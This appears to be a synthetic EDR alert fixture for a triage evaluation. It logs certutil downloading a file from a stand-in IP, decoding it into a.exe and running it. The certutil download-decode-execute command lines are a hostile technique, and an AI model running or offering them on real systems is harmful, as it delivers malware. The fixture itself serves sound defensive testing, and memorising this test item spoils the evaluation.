@@ -1,0 +1,62 @@
+{
+ "alert_id": "EVAL-06",
+ "title": "certutil used with network and decode arguments",
+ "source": "EDR",
+ "host": "WS-MKT-09",
+ "description": "certutil.exe ran with -urlcache and -decode.",
+ "process_events": [
+  {
+   "timestamp": "2026-11-10T14:00:00Z",
+   "pid": 2000,
+   "ppid": 640,
+   "image": "C:\\Windows\\explorer.exe",
+   "command_line": "C:\\Windows\\Explorer.EXE",
+   "user": "CORP\\pbrown"
+  },
+  {
+   "timestamp": "2026-11-10T14:00:10Z",
+   "pid": 8100,
+   "ppid": 2000,
+   "image": "C:\\Windows\\System32\\cmd.exe",
+   "command_line": "cmd.exe",
+   "user": "CORP\\pbrown"
+  },
+  {
+   "timestamp": "2026-11-10T14:00:20Z",
+   "pid": 8110,
+   "ppid": 8100,
+   "image": "C:\\Windows\\System32\\certutil.exe",
+   "command_line": "certutil.exe -urlcache -split -f http://192.0.2.44/a.txt C:\\Users\\Public\\a.txt",
+   "user": "CORP\\pbrown"
+  },
+  {
+   "timestamp": "2026-11-10T14:00:35Z",
+   "pid": 8120,
+   "ppid": 8100,
+   "image": "C:\\Windows\\System32\\certutil.exe",
+   "command_line": "certutil.exe -decode C:\\Users\\Public\\a.txt C:\\Users\\Public\\a.exe",
+   "user": "CORP\\pbrown"
+  },
+  {
+   "timestamp": "2026-11-10T14:00:41Z",
+   "pid": 8130,
+   "ppid": 8100,
+   "image": "C:\\Users\\Public\\a.exe",
+   "command_line": "C:\\Users\\Public\\a.exe",
+   "user": "CORP\\pbrown"
+  }
+ ],
+ "network_connections": [
+  {
+   "timestamp": "2026-11-10T14:00:21Z",
+   "pid": 8110,
+   "src_ip": "10.20.1.25",
+   "dst_ip": "192.0.2.44",
+   "dst_port": 80,
+   "protocol": "tcp",
+   "bytes_out": 380,
+   "bytes_in": 310000,
+   "domain": null
+  }
+ ]
+}
